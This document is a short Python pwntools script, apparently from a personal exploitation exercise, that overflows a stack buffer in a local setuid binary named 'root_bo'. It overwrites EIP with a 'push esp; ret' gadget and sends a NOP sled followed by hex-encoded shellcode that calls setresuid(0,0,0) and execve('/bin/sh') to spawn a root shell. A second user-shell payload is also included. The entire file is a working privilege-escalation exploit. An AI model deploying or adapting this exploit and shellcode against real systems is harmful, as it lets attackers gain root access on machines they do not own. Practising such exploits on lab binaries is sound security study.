#!/usr/bin/python
from pwn import *

offset = 268                    # From start of BUF to right before start of EIP
junk = "A" * offset             # Filler
control_eip = p32(0xdeadbeef)   # Overwrite EIP with random values
control_esp = p32(0xcafebabe)   # Overwrite ESP with random values

exe_name = "/home/tao/shellcode/pop2/root_bo"
p = process(exe_name)       # Starts the vulnerable program
raw_input(str(p.proc.pid))  # For GDB use

# execve("/bin/sh",0,0) ; exit(0)
shellcode_user_shell = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\xcd\x80\xb0\x01\x31\xdb\xcd\x80"

# setresuid(0,0,0) ; execve("/bin/sh",0,0) ; exit(0)
shellcode_root_shell = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\xcd\x80\xb0\x01\x31\xdb\xcd\x80"

# 0x08049091 : push esp ; mov ebx, dword ptr [esp] ; ret
# 
# Store the value of ESP in stack; move VALUE in ESP to EBX ; RETURN to next instruction
# When RETURN is executed, it will pop the ADDRESS of next instruction from stack into EIP
g1 = p32(0x08049091)

control_eip = g1
nop_sled = "\x90" * 16      # Padding with no-op, to make exploit reliable
control_esp = nop_sled

payload = junk + control_eip + control_esp + shellcode_root_shell

p.sendline(payload) # Sends payload

p.interactive()     # Pass control back to user
